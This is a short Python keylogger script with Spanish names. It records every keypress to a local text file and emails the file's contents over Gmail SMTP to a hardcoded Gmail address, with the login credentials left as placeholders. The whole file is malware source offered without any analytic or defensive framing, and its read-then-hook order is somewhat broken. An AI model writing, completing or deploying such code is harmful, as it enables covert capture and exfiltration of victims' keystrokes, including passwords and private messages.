import smtplib
import keyboard

def enviar_email(destinatario, asunto, mensaje):
    remitente = '#'
    password = '#'
    mensaje = 'Subject: {}\n\n{}'.format(asunto, mensaje)

    servidor = smtplib.SMTP('smtp.gmail.com', 587)
    servidor.ehlo()
    servidor.starttls()
    servidor.login(remitente, password)
    servidor.sendmail(remitente, destinatario, mensaje)
    servidor.close()


def guardar_tecla(e):
    with open("teclas_pulsadas.txt", "a") as archivo:
        if e.name == "space" or e.name == "shift":
            archivo.write(" ")
        elif e.name == "backspace":
            archivo.write("eliminar")
        else:
            archivo.write(e.name)

with open("teclas_pulsadas.txt", "r") as file:
    content = file.read()

content_string = str(content)

keyboard.on_press(guardar_tecla)
enviar_email('heronpliego02@gmail.com', 'Subject', content_string)
print("Email sent")
